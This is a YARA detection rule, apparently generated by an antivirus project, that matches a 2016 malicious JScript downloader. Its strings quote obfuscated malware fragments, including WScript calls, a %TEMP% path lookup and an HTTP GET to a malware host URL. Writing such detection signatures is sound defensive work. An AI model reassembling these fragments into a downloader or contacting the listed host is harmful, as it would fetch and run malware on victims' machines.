rule sig_20160428_a64db6c6102853ec4b94396910bb5316 {
  meta:
    description = "datamaliciousorder - file 20160428_a64db6c6102853ec4b94396910bb5316.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "da2b6d64d17d2a567dd8ae5a4ec01aeef0f57d1114ddcb560a78364166aecbca"

  strings:
    $s1  = "function DhfIjpYqhHdfXkgPjpGer(MmsDfkMdoVwcOqhAjhYwt){ApbYmfXcpUtmSvqYheDdj[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function UcgPyuTulJqyOkkCsqWgj() {return ApbYmfXcpUtmSvqYheDdj[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "function DhfIjpYqhHdfXkgPjpGer(MmsDfkMdoVwcOqhAjhYwt){ApbYmfXcpUtmSvqYheDdj[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "return NrkDjqUtqNmjSlpUepVjl - EseNjwQdwAooJqsIakYyj;};" fullword ascii
    $s5  = "function TcjWafLkvKwlCphXsoYxt(NrkDjqUtqNmjSlpUepVjl, EseNjwQdwAooJqsIakYyj){AsnBcnYwlLcoNqoUfxQaw = AsnBcnYwlLcoNqoUfxQaw * 1; " ascii
    $s6  = "SjkLscIpgUjeZmhCqyYja[EioRfeUewHreCtnHrcZcv](\"G\" + \"ET\", \"http://minisupergame.ru/a9osfg\", false);" fullword ascii
    $s7  = "var ApbYmfXcpUtmSvqYheDdj = function SqnNpcGpgAmkVsqQeiCbz() {return LlvRqtBnhBnnGpjCaaSbu[JyxZorTmpOkkEldGpzXye](\"WScript\"+\"" ascii
    $s8  = "var ApbYmfXcpUtmSvqYheDdj = function SqnNpcGpgAmkVsqQeiCbz() {return LlvRqtBnhBnnGpjCaaSbu[JyxZorTmpOkkEldGpzXye](\"WScript\"+\"" ascii
    $s9  = "function UcgPyuTulJqyOkkCsqWgj() {return ApbYmfXcpUtmSvqYheDdj[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s10 = "if (SjkLscIpgUjeZmhCqyYja[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s11 = "function LxsGneGfcEjdCizAjxKuu(){return PqeFkkAelEtkOqwDsdPdk + \"\";};" fullword ascii
    $s12 = "function TcjWafLkvKwlCphXsoYxt(NrkDjqUtqNmjSlpUepVjl, EseNjwQdwAooJqsIakYyj){AsnBcnYwlLcoNqoUfxQaw = AsnBcnYwlLcoNqoUfxQaw * 1; " ascii
    $s13 = "function JmpVrfEidZtxTgiVvcRtp() {return ((YqtUhmOkeGkpEsaEdzDqa == true) && (YqtUhmOkeGkpEsaEdzDqa == CuoVnrNnpKzrYufLiuHij)) ?" ascii
    $s14 = "function VgbAoqRvpPwtApuTvvMbf(){return JyxZorTmpOkkEldGpzXye;};" fullword ascii
    $s15 = "function JmpVrfEidZtxTgiVvcRtp() {return ((YqtUhmOkeGkpEsaEdzDqa == true) && (YqtUhmOkeGkpEsaEdzDqa == CuoVnrNnpKzrYufLiuHij)) ?" ascii
    $s16 = "var LlvRqtBnhBnnGpjCaaSbu = this[\"WScript\"];" fullword ascii
    $s17 = "var FkaIzcWdbLeuSfxKecZxk = new this[\"D\"+\"ate\"]();" fullword ascii
    $s18 = "var YqtUhmOkeGkpEsaEdzDqa = false;" fullword ascii
    $s19 = "function CrdZqfFwaNqjQtpIdbKpl(){return 23;};" fullword ascii
    $s20 = "YqtUhmOkeGkpEsaEdzDqa = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}